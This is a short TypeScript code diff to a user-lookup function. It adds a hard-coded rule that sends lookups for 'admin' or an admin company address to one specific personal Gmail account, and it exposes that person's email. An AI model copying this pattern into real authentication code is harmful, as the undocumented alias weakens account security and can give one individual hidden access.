@@ -270,7 +270,10 @@ export async function saveUser(newUser: ServerUser): Promise<boolean> {
 
 export async function getUserByEmail(email: string): Promise<ServerUser | null> {
   const usersList = await getUsersList();
-  const lowerEmail = email.trim().toLowerCase();
+  let lowerEmail = email.trim().toLowerCase();
+  if (lowerEmail === 'admin' || lowerEmail === 'admin@searchbiz.co.za') {
+    lowerEmail = 'nicholauscostochetty@gmail.com';
+  }
   const user = usersList.find((u: any) => u.email.trim().toLowerCase() === lowerEmail);
   return user || null;
 }
